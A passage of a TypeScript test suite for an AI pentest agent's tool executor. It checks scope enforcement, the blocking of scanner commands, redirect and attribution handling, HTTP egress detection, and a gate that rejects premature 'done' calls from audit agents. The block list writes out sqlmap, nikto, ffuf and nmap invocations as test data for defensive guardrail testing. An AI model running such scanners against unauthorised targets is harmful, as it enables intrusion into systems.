      loggedEvents.find((e) => e.payload?.scope_guards === "inert"),
    ).toBeUndefined();
  });

  it("refuses outright under PWNKIT_REQUIRE_SCOPE=1", async () => {
    process.env.PWNKIT_REQUIRE_SCOPE = "1";
    const ex = new ToolExecutor(unscopedCtx(), null);

    const result = await ex.execute({
      name: "bash",
      arguments: { command: "echo hello" },
    });

    expect(result.success).toBe(false);
    expect(result.error).toMatch(/PWNKIT_REQUIRE_SCOPE/);
    expect(result.error).toMatch(/no engagement scope is configured/);
  });

  it("PWNKIT_REQUIRE_SCOPE=1 does not affect a scan that HAS a scope", async () => {
    process.env.PWNKIT_REQUIRE_SCOPE = "1";
    const { ScopePolicy } = await import("../scope/scope.js");
    const ex = new ToolExecutor(
      { ...unscopedCtx(), scope: ScopePolicy.fromJson({ in_scope: ["*.example.com"] }) },
      null,
    );

    const result = await ex.execute({ name: "bash", arguments: { command: "echo hello" } });
    expect(result.success).toBe(true);
  });
});

// pwnkit#217. Generic-scanner-traffic suppression. When scope is loaded
// the agent must refuse `sqlmap`, `nikto`, `gobuster`, `dirb`, `wfuzz`,
// `ffuf`, and the noisy nmap modes (`-sV`, `-A`). The unit tests for
// the detector live in `scope/scanner-binaries.test.ts`; these tests
// verify the wiring at the `ToolExecutor` boundary — i.e. that the
// scope-loaded gate fires, the `--allow-scanners` opt-out (threaded
// in as `ctx.allowScanners`) actually overrides, and that pass-through
// is preserved when scope is absent.

describe("ToolExecutor — scanner suppression (pwnkit#217)", () => {
  async function makeCtx(opts: { withScope: boolean; allowScanners?: boolean }) {
    const { ScopePolicy } = await import("../scope/scope.js");
    const scope = opts.withScope
      ? ScopePolicy.fromJson({ in_scope: ["*.example.com"] })
      : undefined;
    const ctx: ToolContext = {
      target: "https://api.example.com",
      scanId: `test-scanner-${Math.random().toString(36).slice(2)}`,
      findings: [],
      attackResults: [],
      targetInfo: {},
      scope,
      allowScanners: opts.allowScanners,
    };
    return ctx;
  }

  const blacklistedInvocations: Array<{ label: string; command: string; binary: string }> = [
    { label: "sqlmap", command: "sqlmap -u https://api.example.com/?id=1 --batch", binary: "sqlmap" },
    { label: "nikto", command: "nikto -h https://api.example.com", binary: "nikto" },
    { label: "gobuster", command: "gobuster dir -u https://api.example.com -w wordlist.txt", binary: "gobuster" },
    { label: "dirb", command: "dirb https://api.example.com", binary: "dirb" },
    { label: "wfuzz", command: "wfuzz -c -z file,wordlist.txt https://api.example.com/FUZZ", binary: "wfuzz" },
    { label: "ffuf", command: "ffuf -u https://api.example.com/FUZZ -w wordlist.txt", binary: "ffuf" },
    { label: "nmap -sV", command: "nmap -sV api.example.com", binary: "nmap -sV" },
    { label: "nmap -A", command: "nmap -A api.example.com", binary: "nmap -A" },
  ];

  for (const { label, command, binary } of blacklistedInvocations) {
    it(`bash refuses ${label} when scope is loaded`, async () => {
      const ctx = await makeCtx({ withScope: true });
      const ex = new ToolExecutor(ctx, null);
      const result = await ex.execute({ name: "bash", arguments: { command } });
      expect(result.success).toBe(false);
      expect(result.error).toMatch(/bash refused/);
      expect(result.error).toContain(binary);
    });
  }

  it("bash passes scanner commands through when no scope is loaded", async () => {
    // Without scope, the gate is silent — the command attempts to run.
    // We can't actually exec sqlmap in a unit test (and shouldn't), but
    // we can verify the failure mode is NOT the scanner gate. If the
    // binary is missing the bash exec returns `success:false` with an
    // exit-code or "command not found" error — anything other than the
    // "bash refused: 'sqlmap' is a generic vulnerability scanner"
    // message is acceptable here.
    const ctx = await makeCtx({ withScope: false });
    const ex = new ToolExecutor(ctx, null);
    const result = await ex.execute({
      name: "bash",
      arguments: { command: "sqlmap --version" },
    });
    if (!result.success) {
      expect(result.error).not.toMatch(/generic vulnerability scanner/);
    }
  });

  it("bash passes scanner commands through when allowScanners=true even with scope", async () => {
    const ctx = await makeCtx({ withScope: true, allowScanners: true });
    const ex = new ToolExecutor(ctx, null);
    const result = await ex.execute({
      name: "bash",
      arguments: { command: "sqlmap --version" },
    });
    if (!result.success) {
      // The gate is bypassed — failure must come from somewhere else.
      expect(result.error).not.toMatch(/generic vulnerability scanner/);
      expect(result.error).not.toMatch(/bash refused: 'sqlmap'/);
    }
  });

  it("bash still allows non-scanner commands when scope is loaded", async () => {
    // bash availability varies across CI / dev platforms (Windows boxes
    // running these tests don't ship bash by default). What we can pin
    // platform-independently is that the failure mode for `echo hello`
    // when scope is loaded is NOT the scanner gate. If bash IS available
    // the command runs and we confirm "hello" in the output; if bash
    // isn't, the failure must come from spawn / exec, not the gate.
    const ctx = await makeCtx({ withScope: true });
    const ex = new ToolExecutor(ctx, null);
    const result = await ex.execute({
      name: "bash",
      arguments: { command: "echo hello" },
    });
    if (result.success) {
      expect(String(result.output)).toContain("hello");
    } else {
      expect(result.error).not.toMatch(/generic vulnerability scanner/);
      expect(result.error).not.toMatch(/generic-scanner/);
    }
  });

  it("bash still allows plain `nmap` (port scan) when scope is loaded", async () => {
    // nmap with no fingerprint flags is allowed — this is the carve-out
    // documented in the issue body. The actual exec will fail in CI if
    // nmap isn't installed, but the gate must NOT be the failure mode.
    const ctx = await makeCtx({ withScope: true });
    const ex = new ToolExecutor(ctx, null);
    const result = await ex.execute({
      name: "bash",
      arguments: { command: "nmap --version" },
    });
    if (!result.success) {
      expect(result.error).not.toMatch(/generic-scanner/);
      expect(result.error).not.toMatch(/bash refused: 'nmap/);
    }
  });

  it("bash refuses `python3 -m sqlmap` (module form)", async () => {
    const ctx = await makeCtx({ withScope: true });
    const ex = new ToolExecutor(ctx, null);
    const result = await ex.execute({
      name: "bash",
      arguments: { command: "python3 -m sqlmap -u https://api.example.com/" },
    });
    expect(result.success).toBe(false);
    expect(result.error).toContain("python -m sqlmap");
  });

  it("the scanner-gate error names --allow-scanners as the override", async () => {
    const ctx = await makeCtx({ withScope: true });
    const ex = new ToolExecutor(ctx, null);
    const result = await ex.execute({
      name: "bash",
      arguments: { command: "ffuf -u https://api.example.com/FUZZ -w w.txt" },
    });
    expect(result.success).toBe(false);
    expect(result.error).toMatch(/--allow-scanners/);
  });
});

// ── Structured scanner wrappers at the executor surface (pwnkit#555) ──
//
// The argv-builder / parser unit tests live in `scanner-tools.test.ts`. These
// pin the gating + scope/argument wiring at the ToolExecutor boundary: the
// wrappers hard-refuse unless allowScanners, refuse out-of-scope targets, and
// validate required arguments — all BEFORE any binary is spawned, so they run
// without sqlmap/nmap/ffuf/nuclei installed.

describe("ToolExecutor — structured scanner wrappers (pwnkit#555)", () => {
  async function makeCtx(opts: { allowScanners?: boolean }) {
    const { ScopePolicy } = await import("../scope/scope.js");
    const ctx: ToolContext = {
      target: "https://api.example.com",
      scanId: `test-runscanner-${Math.random().toString(36).slice(2)}`,
      findings: [],
      attackResults: [],
      targetInfo: {},
      scope: ScopePolicy.fromJson({ in_scope: ["*.example.com"] }),
      allowScanners: opts.allowScanners,
    };
    return ctx;
  }

  for (const tool of ["run_sqlmap", "run_nmap", "run_ffuf", "run_nuclei"]) {
    it(`${tool} is hard-refused when allowScanners is unset`, async () => {
      const ctx = await makeCtx({ allowScanners: false });
      const ex = new ToolExecutor(ctx, null);
      const args =
        tool === "run_ffuf"
          ? { url: "https://api.example.com/FUZZ", wordlist: "/tmp/w.txt" }
          : tool === "run_nmap" || tool === "run_nuclei"
            ? { target: "api.example.com" }
            : { url: "https://api.example.com/?id=1" };
      const result = await ex.execute({ name: tool, arguments: args });
      expect(result.success).toBe(false);
      expect(result.error).toMatch(/--allow-scanners/);
    });
  }

  it("run_sqlmap refuses (deny-by-default) when allowScanners=true but NO scope is configured (pwnkit#926)", async () => {
    const ctx: ToolContext = {
      target: "https://api.example.com",
      scanId: `test-noscope-${Math.random().toString(36).slice(2)}`,
      findings: [],
      attackResults: [],
      targetInfo: {},
      allowScanners: true,
      // scope intentionally omitted — an authorized engagement must be scoped.
    };
    const ex = new ToolExecutor(ctx, null);
    const result = await ex.execute({
      name: "run_sqlmap",
      arguments: { url: "https://api.example.com/?id=1" },
    });
    expect(result.success).toBe(false);
    expect(result.error).toMatch(/no engagement scope|deny-by-default/i);
  });

  it("run_sqlmap refuses an out-of-scope target even with allowScanners", async () => {
    const ctx = await makeCtx({ allowScanners: true });
    const ex = new ToolExecutor(ctx, null);
    const result = await ex.execute({
      name: "run_sqlmap",
      arguments: { url: "https://evil.attacker.test/?id=1" },
    });
    expect(result.success).toBe(false);
    expect(result.error).toMatch(/out-of-scope/);
  });

  it("run_nmap refuses an out-of-scope host even with allowScanners", async () => {
    const ctx = await makeCtx({ allowScanners: true });
    const ex = new ToolExecutor(ctx, null);
    const result = await ex.execute({
      name: "run_nmap",
      arguments: { target: "evil.attacker.test" },
    });
    expect(result.success).toBe(false);
    expect(result.error).toMatch(/out-of-scope/);
  });

  it("run_ffuf requires a FUZZ keyword in the url", async () => {
    const ctx = await makeCtx({ allowScanners: true });
    const ex = new ToolExecutor(ctx, null);
    const result = await ex.execute({
      name: "run_ffuf",
      arguments: { url: "https://api.example.com/", wordlist: "/tmp/w.txt" },
    });
    expect(result.success).toBe(false);
    expect(result.error).toMatch(/FUZZ/);
  });

  it("run_sqlmap reports a clear error when the binary is missing", async () => {
    // allowScanners + in-scope target → preflight passes and we attempt to
    // spawn `sqlmap`. On a runner without sqlmap installed this surfaces as a
    // structured ENOENT error (never an unbounded hang). If sqlmap IS present
    // the run completes structured; either way success is well-defined.
    const ctx = await makeCtx({ allowScanners: true });
    const ex = new ToolExecutor(ctx, null);
    const result = await ex.execute({
      name: "run_sqlmap",
      arguments: { url: "https://api.example.com/?id=1", timeout: 2 },
    });
    if (!result.success) {
      expect(result.error).toMatch(/run_sqlmap (failed|)/);
    } else {
      expect((result.output as { result: { tool: string } }).result.tool).toBe("sqlmap");
    }
  });
});

// ── Attribution-header injection at the executor surface (pwnkit#216) ──
//
// The unit tests in attribution.test.ts cover the helper directly. These
// integration tests pin that http_request actually attaches the configured
// headers to its outbound fetch when scope + attribution are wired through
// ToolContext. We mock global `fetch` so we can inspect the RequestInit
// the executor passes into it without actually hitting the network.

describe("ToolExecutor — attribution-header injection (pwnkit#216)", () => {
  it("http_request attaches configured attribution headers on in-scope traffic", async () => {
    const { ScopePolicy } = await import("../scope/scope.js");
    const scope = ScopePolicy.fromJson({ in_scope: ["api.example.com"] });

    const calls: Array<{ url: string; init?: RequestInit }> = [];
    const originalFetch = globalThis.fetch;
    globalThis.fetch = (async (url: any, init?: RequestInit) => {
      calls.push({ url: String(url), init });
      return new Response("ok", { status: 200 });
    }) as any;

    try {
      const ctx: ToolContext = {
        target: "https://api.example.com",
        scanId: "test-attr-1",
        findings: [],
        attackResults: [],
        targetInfo: {},
        scope,
        attribution: {
          headers: { "X-Pentest": "engagement-123" },
          userAgentToken: "engagement-123",
        },
      };
      const ex = new ToolExecutor(ctx, null);
      const result = await ex.execute({
        name: "http_request",
        arguments: { url: "https://api.example.com/health", method: "GET" },
      });
      expect(result.success).toBe(true);
      expect(calls).toHaveLength(1);
      const sentHeaders = calls[0].init!.headers as Record<string, string>;
      expect(sentHeaders["X-Pentest"]).toBe("engagement-123");
      // UA must contain the engagement token.
      expect(sentHeaders["User-Agent"]).toMatch(/engagement: engagement-123/);
    } finally {
      globalThis.fetch = originalFetch;
    }
  });

  it("http_request does NOT attach attribution when no attribution is configured", async () => {
    const calls: Array<{ url: string; init?: RequestInit }> = [];
    const originalFetch = globalThis.fetch;
    globalThis.fetch = (async (url: any, init?: RequestInit) => {
      calls.push({ url: String(url), init });
      return new Response("ok", { status: 200 });
    }) as any;

    try {
      const ctx: ToolContext = {
        target: "https://api.example.com",
        scanId: "test-attr-2",
        findings: [],
        attackResults: [],
        targetInfo: {},
        // No scope, no attribution → identical to pre-#216 behaviour.
      };
      const ex = new ToolExecutor(ctx, null);
      await ex.execute({
        name: "http_request",
        arguments: { url: "https://api.example.com/health", method: "GET" },
      });
      const sentHeaders = calls[0].init!.headers as Record<string, string>;
      expect(sentHeaders["X-Pentest"]).toBeUndefined();
      // No engagement token configured → no engagement-tagged UA.
      expect(sentHeaders["User-Agent"]).toBeUndefined();
    } finally {
      globalThis.fetch = originalFetch;
    }
  });

  it("submit_form attaches configured attribution headers on in-scope traffic", async () => {
    // Mirrors the http_request integration test above. submit_form receives
    // identical applyAttribution wiring, so we pin the same invariant at the
    // executor surface so a future refactor can't quietly drop it.
    const { ScopePolicy } = await import("../scope/scope.js");
    const scope = ScopePolicy.fromJson({ in_scope: ["api.example.com"] });

    const calls: Array<{ url: string; init?: RequestInit }> = [];
    const originalFetch = globalThis.fetch;
    globalThis.fetch = (async (url: any, init?: RequestInit) => {
      calls.push({ url: String(url), init });
      return new Response("ok", { status: 200 });
    }) as any;

    try {
      const ctx: ToolContext = {
        target: "https://api.example.com",
        scanId: "test-attr-form",
        findings: [],
        attackResults: [],
        targetInfo: {},
        scope,
        attribution: {
          headers: { "X-Pentest": "engagement-123" },
          userAgentToken: "engagement-123",
        },
      };
      const ex = new ToolExecutor(ctx, null);
      const result = await ex.execute({
        name: "submit_form",
        arguments: { url: "https://api.example.com/login", fields: { user: "test" } },
      });
      expect(result.success).toBe(true);
      expect(calls).toHaveLength(1);
      const sentHeaders = calls[0].init!.headers as Record<string, string>;
      expect(sentHeaders["X-Pentest"]).toBe("engagement-123");
      expect(sentHeaders["User-Agent"]).toMatch(/engagement: engagement-123/);
    } finally {
      globalThis.fetch = originalFetch;
    }
  });
});

describe("ToolExecutor — crawl redirect handling (pwnkit#238)", () => {
  it("does NOT leak attribution headers across an out-of-scope redirect", async () => {
    const { ScopePolicy } = await import("../scope/scope.js");
    const scope = ScopePolicy.fromJson({
      in_scope: ["app.example.com"],
      out_of_scope: ["evil.example.com"],
    });

    const calls: Array<{ url: string; init?: RequestInit }> = [];
    const originalFetch = globalThis.fetch;
    globalThis.fetch = (async (url: any, init?: RequestInit) => {
      calls.push({ url: String(url), init });
      // Same-origin redirect to a host that's explicitly out of scope.
      // The crawler must REFUSE to follow rather than ride attribution
      // headers to evil.example.com.
      return new Response("", {
        status: 302,
        headers: { Location: "https://evil.example.com/landing" },
      });
    }) as any;

    try {
      const ctx: ToolContext = {
        target: "https://app.example.com",
        scanId: "test-redirect-leak",
        findings: [],
        attackResults: [],
        targetInfo: {},
        scope,
        attribution: {
          headers: { "X-Pentest": "engagement-123" },
          userAgentToken: "engagement-123",
        },
      };
      const ex = new ToolExecutor(ctx, null);
      const result = await ex.execute({
        name: "crawl",
        arguments: { url: "https://app.example.com/", depth: 1 },
      });
      expect(result.success).toBe(true);
      // EXACTLY one outbound fetch — the second hop must not have happened.
      expect(calls).toHaveLength(1);
      expect(calls[0].url).toBe("https://app.example.com/");
      // The response we sent the headers to was the in-scope first hop.
      const firstHeaders = calls[0].init!.headers as Record<string, string>;
      expect(firstHeaders["X-Pentest"]).toBe("engagement-123");
      // No second fetch existed — so attribution couldn't have leaked.
    } finally {
      globalThis.fetch = originalFetch;
    }
  });

  it("follows in-scope same-origin redirects with attribution still attached", async () => {
    const { ScopePolicy } = await import("../scope/scope.js");
    const scope = ScopePolicy.fromJson({ in_scope: ["app.example.com"] });

    const calls: Array<{ url: string; init?: RequestInit }> = [];
    const originalFetch = globalThis.fetch;
    globalThis.fetch = (async (url: any, init?: RequestInit) => {
      calls.push({ url: String(url), init });
      if (calls.length === 1) {
        return new Response("", {
          status: 301,
          headers: { Location: "https://app.example.com/v2/" },
        });
      }
      return new Response("<html><body>ok</body></html>", {
        status: 200,
        headers: { "Content-Type": "text/html" },
      });
    }) as any;

    try {
      const ctx: ToolContext = {
        target: "https://app.example.com",
        scanId: "test-redirect-follow",
        findings: [],
        attackResults: [],
        targetInfo: {},
        scope,
        attribution: { headers: { "X-Pentest": "eng-1" } },
      };
      const ex = new ToolExecutor(ctx, null);
      const result = await ex.execute({
        name: "crawl",
        arguments: { url: "https://app.example.com/", depth: 1 },
      });
      expect(result.success).toBe(true);
      expect(calls).toHaveLength(2);
      expect(calls[1].url).toBe("https://app.example.com/v2/");
      // Both hops carry attribution because both are in-scope same-origin.
      expect((calls[0].init!.headers as Record<string, string>)["X-Pentest"]).toBe("eng-1");
      expect((calls[1].init!.headers as Record<string, string>)["X-Pentest"]).toBe("eng-1");
    } finally {
      globalThis.fetch = originalFetch;
    }
  });

  it("refuses cross-origin redirects even when the target is in scope by host pattern", async () => {
    const { ScopePolicy } = await import("../scope/scope.js");
    // Both hosts are technically in-scope, but crawl is a same-origin
    // walk — cross-origin must still be refused so we don't ship
    // attribution to a host the operator didn't explicitly start on.
    const scope = ScopePolicy.fromJson({
      in_scope: ["app.example.com", "other.example.com"],
    });

    const calls: Array<{ url: string; init?: RequestInit }> = [];
    const originalFetch = globalThis.fetch;
    globalThis.fetch = (async (url: any, init?: RequestInit) => {
      calls.push({ url: String(url), init });
      return new Response("", {
        status: 302,
        headers: { Location: "https://other.example.com/" },
      });
    }) as any;

    try {
      const ctx: ToolContext = {
        target: "https://app.example.com",
        scanId: "test-redirect-xorigin",
        findings: [],
        attackResults: [],
        targetInfo: {},
        scope,
        attribution: { headers: { "X-Pentest": "eng-x" } },
      };
      const ex = new ToolExecutor(ctx, null);
      const result = await ex.execute({
        name: "crawl",
        arguments: { url: "https://app.example.com/", depth: 1 },
      });
      expect(result.success).toBe(true);
      expect(calls).toHaveLength(1);
    } finally {
      globalThis.fetch = originalFetch;
    }
  });

  it("non-redirect 200 path is unaffected by manual-redirect handling", async () => {
    // Sanity check: the manual-redirect plumbing (pwnkit#238) must not
    // change behaviour on the happy path. A plain 200 should be processed
    // exactly as before — single fetch, body parsed, attribution sent on
    // the (only) request.
    const { ScopePolicy } = await import("../scope/scope.js");
    const scope = ScopePolicy.fromJson({ in_scope: ["app.example.com"] });

    const calls: Array<{ url: string; init?: RequestInit }> = [];
    const originalFetch = globalThis.fetch;
    globalThis.fetch = (async (url: any, init?: RequestInit) => {
      calls.push({ url: String(url), init });
      return new Response(
        '<html><body><a href="/about">about</a></body></html>',
        { status: 200, headers: { "Content-Type": "text/html" } },
      );
    }) as any;

    try {
      const ctx: ToolContext = {
        target: "https://app.example.com",
        scanId: "test-redirect-noop",
        findings: [],
        attackResults: [],
        targetInfo: {},
        scope,
        attribution: { headers: { "X-Pentest": "eng-noop" } },
      };
      const ex = new ToolExecutor(ctx, null);
      const result = await ex.execute({
        name: "crawl",
        arguments: { url: "https://app.example.com/", depth: 1 },
      });
      expect(result.success).toBe(true);
      expect(calls).toHaveLength(1);
      const headers = calls[0].init!.headers as Record<string, string>;
      expect(headers["X-Pentest"]).toBe("eng-noop");
      const out = result.output as { pages: Array<{ status: number; links: string[] }> };
      expect(out.pages[0].status).toBe(200);
      // Body actually got parsed (link extraction ran).
      expect(out.pages[0].links.length).toBeGreaterThan(0);
    } finally {
      globalThis.fetch = originalFetch;
    }
  });

  it("aborts cleanly when a same-origin redirect chain exceeds the 5-hop cap", async () => {
    // Infinite same-origin in-scope redirect loop. The crawler must
    // bail on the MAX_REDIRECTS+1 hop rather than spin forever or DoS
    // the target. We assert a finite bounded number of fetches and
    // a clean ToolResult (success=true with the page recorded as
    // bailed; the redirect plumbing returns an inline `error` rather
    // than tearing down the whole crawl).
    const { ScopePolicy } = await import("../scope/scope.js");
    const scope = ScopePolicy.fromJson({ in_scope: ["app.example.com"] });

    const calls: Array<{ url: string; init?: RequestInit }> = [];
    const originalFetch = globalThis.fetch;
    globalThis.fetch = (async (url: any, init?: RequestInit) => {
      calls.push({ url: String(url), init });
      // Always 302 to a fresh same-origin path so the next-URL check
      // passes (in-scope, same-origin, http) — only the hop counter
      // can stop us.
      return new Response("", {
        status: 302,
        headers: { Location: `https://app.example.com/loop/${calls.length}` },
      });
    }) as any;

    try {
      const ctx: ToolContext = {
        target: "https://app.example.com",
        scanId: "test-redirect-loop",
        findings: [],
        attackResults: [],
        targetInfo: {},
        scope,
        attribution: { headers: { "X-Pentest": "eng-loop" } },
      };
      const ex = new ToolExecutor(ctx, null);
      const result = await ex.execute({
        name: "crawl",
        arguments: { url: "https://app.example.com/", depth: 1 },
      });
      expect(result.success).toBe(true);
      // MAX_REDIRECTS=5 → initial + 5 follows = 6 fetches, then bail.
      // The cap MUST hold the call count to a small finite number.
      expect(calls.length).toBeLessThanOrEqual(6);
      expect(calls.length).toBeGreaterThan(1);
      const out = result.output as { pages: Array<Record<string, unknown>> };
      expect(out.pages[0].error).toMatch(/too many redirects/);
    } finally {
      globalThis.fetch = originalFetch;
    }
  });
});

// ── `done`-tool coverage gate (#audit-laziness) ──

describe("evaluateDoneCoverageGate", () => {
  const baseEnv = {} as NodeJS.ProcessEnv;

  it("rejects when no source has been inspected (1 read_file: package.json case)", () => {
    // The motivating bug: @vercel/og scan emitted `done` after exactly
    // one `read_file: package.json` (non-source extension) in 11 seconds.
    const decision = evaluateDoneCoverageGate(
      {
        sourceFilesRead: 0,
        runCommandCount: 0,
        totalToolCalls: 1, // the package.json read
        elapsedMs: 11_000,
        priorRejections: 0,
      },
      baseEnv,
    );
    expect(decision.pass).toBe(false);
    expect(decision.reason).toMatch(/done rejected/);
    expect(decision.reason).toMatch(/0 distinct source/);
  });

  it("passes when threshold of distinct source files is met", () => {
    const decision = evaluateDoneCoverageGate(
      {
        sourceFilesRead: 3,
        runCommandCount: 0,
        totalToolCalls: 3,
        elapsedMs: 5_000,
        priorRejections: 0,
      },
      baseEnv,
    );
    expect(decision.pass).toBe(true);
  });

  it("passes when at least one run_command was used (shell-driven recon)", () => {
    const decision = evaluateDoneCoverageGate(
      {
        sourceFilesRead: 0,
        runCommandCount: 1,
        totalToolCalls: 1,
        elapsedMs: 5_000,
        priorRejections: 0,
      },
      baseEnv,
    );
    expect(decision.pass).toBe(true);
  });

  it("passes after > 60s with >= 5 tool calls (long-running genuine audit)", () => {
    const decision = evaluateDoneCoverageGate(
      {
        sourceFilesRead: 0,
        runCommandCount: 0,
        totalToolCalls: 5,
        elapsedMs: 61_000,
        priorRejections: 0,
      },
      baseEnv,
    );
    expect(decision.pass).toBe(true);
  });

  it("honors PWNKIT_AUDIT_MIN_COVERAGE_FILES env override", () => {
    // Loosen the threshold to 1 — single source file should now pass.
    const decision = evaluateDoneCoverageGate(
      {
        sourceFilesRead: 1,
        runCommandCount: 0,
        totalToolCalls: 1,
        elapsedMs: 5_000,
        priorRejections: 0,
      },
      { PWNKIT_AUDIT_MIN_COVERAGE_FILES: "1" } as NodeJS.ProcessEnv,
    );
    expect(decision.pass).toBe(true);
  });

  it("disables the gate when PWNKIT_AUDIT_DONE_GATE=0", () => {
    const decision = evaluateDoneCoverageGate(
      {
        sourceFilesRead: 0,
        runCommandCount: 0,
        totalToolCalls: 1,
        elapsedMs: 1_000,
        priorRejections: 0,
      },
      { PWNKIT_AUDIT_DONE_GATE: "0" } as NodeJS.ProcessEnv,
    );
    expect(decision.pass).toBe(true);
  });

  it("never deadlocks — third rejection passes through", () => {
    const decision = evaluateDoneCoverageGate(
      {
        sourceFilesRead: 0,
        runCommandCount: 0,
        totalToolCalls: 1,
        elapsedMs: 5_000,
        priorRejections: 2,
      },
      baseEnv,
    );
    expect(decision.pass).toBe(true);
  });
});

describe("ToolExecutor — `done` coverage gate integration (#audit-laziness)", () => {
  let tmp: string;

  beforeEach(() => {
    tmp = mkdtempSync(join(tmpdir(), "audit-done-gate-"));
    writeFileSync(join(tmp, "package.json"), JSON.stringify({ name: "demo", main: "src/index.js" }));
    writeFileSync(join(tmp, "src-index.js"), "module.exports = function () { return 1; };\n");
    writeFileSync(join(tmp, "src-handler.js"), "module.exports = function (req) { return req.body; };\n");
    writeFileSync(join(tmp, "src-helper.js"), "module.exports = function (s) { return s.toString(); };\n");
  });

  afterEach(() => {
    rmSync(tmp, { recursive: true, force: true });
  });

  function makeAuditCtx(): ToolContext {
    return {
      target: "package://demo@1.0.0",
      scanId: "audit-scan-laziness",
      role: "audit",
      findings: [],
      attackResults: [],
      targetInfo: {},
      scopePath: tmp,
    };
  }

  it("rejects `done` after one read_file: package.json (replicates @vercel/og 11s/2-call trace)", async () => {
    const executor = new ToolExecutor(makeAuditCtx(), null);

    // Step 1: agent only reads package.json.
    const readPkg = await executor.execute({
      name: "read_file",
      arguments: { path: "package.json" },
    });
    expect(readPkg.success).toBe(true);

    // Step 2: agent emits `done` — must be refused.
    const doneCall = await executor.execute({
      name: "done",
      arguments: { summary: "Reviewed only package.json for demo@1.0.0. Nothing to audit." },
    });
    expect(doneCall.success).toBe(false);
    expect(doneCall.error).toMatch(/done rejected/);
    expect(doneCall.error).toMatch(/main exports/);
  });

  it("a follow-up tool-call sequence that reads 3 source files passes the gate", async () => {
    const executor = new ToolExecutor(makeAuditCtx(), null);

    // First read just package.json + try to bail (rejected).
    await executor.execute({ name: "read_file", arguments: { path: "package.json" } });
    const firstDone = await executor.execute({
      name: "done",
      arguments: { summary: "Bailing." },
    });
    expect(firstDone.success).toBe(false);

    // Now the agent does the work the rejection message asked for.
    await executor.execute({ name: "read_file", arguments: { path: "src-index.js" } });
    await executor.execute({ name: "read_file", arguments: { path: "src-handler.js" } });
    await executor.execute({ name: "read_file", arguments: { path: "src-helper.js" } });

    const secondDone = await executor.execute({
      name: "done",
      arguments: { summary: "Reviewed entry, handler, helper. No exploitable issues." },
    });
    expect(secondDone.success).toBe(true);
    expect((secondDone.output as any).done).toBe(true);
  });

  it("non-audit roles bypass the gate (attack agent emitting done with one call still succeeds)", async () => {
    const ctx: ToolContext = {
      target: "https://target.test",
      scanId: "attack-scan",
      role: "attack",
      findings: [],
      attackResults: [],
      targetInfo: {},
      scopePath: tmp,
    };
    const executor = new ToolExecutor(ctx, null);
    const result = await executor.execute({
      name: "done",
      arguments: { summary: "No findings on this target." },
    });
    expect(result.success).toBe(true);
  });

  it("ctx without a role (legacy callers) bypasses the gate", async () => {
    const ctx: ToolContext = {
      target: "https://target.test",
      scanId: "legacy-scan",
      findings: [],
      attackResults: [],
      targetInfo: {},
    };
    const executor = new ToolExecutor(ctx, null);
    const result = await executor.execute({
      name: "done",
      arguments: { summary: "ok" },
    });
    expect(result.success).toBe(true);
  });
});

// ── http_audit enforcement: path allowlist + counters + bash egress ──────
// Mirrors the scope-enforcement suite above but for the EnforcementTracker
// path-prefix allowlist and the scope/blocked counters that feed
// `enforcement_summary`. See `scope/enforcement.ts` and the FROZEN CONTRACT.
import { detectHttpEgressSegments } from "./tools.js";
import { PathPolicy, EnforcementTracker } from "../scope/enforcement.js";
import { ScopePolicy as HttpAuditScopePolicy } from "../scope/scope.js";
import { RateLimiter } from "../scope/rate-limit.js";
import { WafDetector } from "../scope/waf-detect.js";
import { resolveEngagementProfile } from "../scope/engagement-profile.js";

describe("detectHttpEgressSegments", () => {
  it("detects curl / wget / httpie", () => {
    expect(detectHttpEgressSegments("curl https://t/api").length).toBe(1);
    expect(detectHttpEgressSegments("wget https://t/x").length).toBe(1);
    expect(detectHttpEgressSegments("http GET https://t/x").length).toBe(1);
  });

  it("detects python http libraries", () => {
    expect(
      detectHttpEgressSegments("python3 -c 'import requests; requests.get(\"https://t\")'").length,
    ).toBe(1);
    expect(
      detectHttpEgressSegments("python -c 'import urllib.request; urllib.request.urlopen(1)'").length,
    ).toBe(1);
  });

  it("ignores non-egress commands", () => {
    expect(detectHttpEgressSegments("grep -r foo .").length).toBe(0);
    expect(detectHttpEgressSegments("echo hello | jq .").length).toBe(0);
    expect(detectHttpEgressSegments("ls -la /tmp").length).toBe(0);
  });

  it("splits on pipes / && / ; and reports each egress segment", () => {
    const hits = detectHttpEgressSegments("curl https://t/a && cat x | wget https://t/b");
    expect(hits.length).toBe(2);
  });
});

describe("ToolExecutor — http_audit enforcement (FROZEN CONTRACT)", () => {
  function httpAuditCtx(overrides: Partial<ToolContext> = {}): ToolContext {
    const scope = ScopePolicyFromHosts(["api.example.com"]);
    const enforcement = new EnforcementTracker({
      pathPolicy: new PathPolicy(["/api"]),
      auth: { type: "bearer", token: "x" },
      killAfterSec: 1800,
    });
    return {
      target: "https://api.example.com",
      scanId: "http-audit-1",
      findings: [],
      attackResults: [],
      targetInfo: {},
      scope,
      enforcement,
      ...overrides,
    };
  }

  it("http_request blocks an out-of-path URL and counts it", async () => {
    const ctx = httpAuditCtx();
    const ex = new ToolExecutor(ctx, null);
    const result = await ex.execute({
      name: "http_request",
      arguments: { url: "https://api.example.com/secret" },
    });
    expect(result.success).toBe(false);
    expect(result.error).toMatch(/Scope violation/);
    const s = ctx.enforcement!.summarize();
    expect(s.requests_out_of_scope_blocked).toBe(1);
    expect(s.requests_in_scope).toBe(0);
  });

  it("http_request counts an in-scope, in-path request", async () => {
    const ctx = httpAuditCtx();
    const fetchStub = vi.fn(async () => ({
      ok: true,
      status: 200,
      url: "https://api.example.com/api/health",
      headers: new Headers({ "content-type": "text/plain" }),
      text: async () => "ok",
      json: async () => ({}),
    }));
    vi.stubGlobal("fetch", fetchStub);
    try {
      const ex = new ToolExecutor(ctx, null);
      await ex.execute({
        name: "http_request",
        arguments: { url: "https://api.example.com/api/health" },
      });
      const s = ctx.enforcement!.summarize();
      expect(s.requests_in_scope).toBe(1);
      expect(s.requests_out_of_scope_blocked).toBe(0);
      expect(fetchStub).toHaveBeenCalled();
    } finally {
      vi.unstubAllGlobals();
    }
  });

  it("bash refuses an out-of-path curl and counts it", async () => {
    const ctx = httpAuditCtx();
    const ex = new ToolExecutor(ctx, null);
    const result = await ex.execute({
      name: "bash",
      arguments: { command: "curl https://api.example.com/secret" },
    });
    expect(result.success).toBe(false);
    expect(result.error).toMatch(/out-of-path|Scope/);
    expect(ctx.enforcement!.summarize().requests_out_of_scope_blocked).toBe(1);
  });

  it("bash fail-closed on an egress command with no resolvable URL", async () => {
    const ctx = httpAuditCtx();
    const ex = new ToolExecutor(ctx, null);
    const result = await ex.execute({
